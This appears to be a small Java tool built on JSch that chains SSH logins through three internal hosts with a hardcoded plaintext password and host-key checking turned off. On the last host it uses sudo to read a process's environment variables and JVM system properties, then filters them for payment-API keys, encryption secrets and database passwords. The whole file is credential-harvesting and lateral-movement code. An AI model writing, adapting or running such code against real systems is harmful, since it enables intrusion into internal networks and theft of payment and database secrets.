import com.jcraft.jsch.*;
import java.io.*;
class DKRT {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session jump = j.getSession("user", "10.14.36.23", 22);
    jump.setPassword("kutul0nc4t");
    jump.setConfig(p);
    jump.setTimeout(10000);
    jump.connect();
    ChannelExec ch = (ChannelExec) jump.openChannel("exec");
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.117 'sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.196 \"echo ---PROC-ENVIRON---;echo kutul0nc4t | sudo -S cat /proc/789/environ 2>/dev/null | tr \\\"\\\\0\\\" \\\"\\\\n\\\" | grep -vE \\\"^PATH=\\\\|^HOME=\\\\|^SHELL=\\\" | head -30;echo ---JCMD-PROPS---;echo kutul0nc4t | sudo -S /usr/lib/jvm/java-1.8.0-amazon-corretto/bin/jcmd 789 VM.system_properties 2>/dev/null | grep -iE \\\"xendit\\\\|xnd_\\\\|jasypt\\\\|encryptor\\\\|db.pass\\\" | head -10\" 2>&1' 2>&1 | head -50");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[16384];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    jump.disconnect();
  }
}
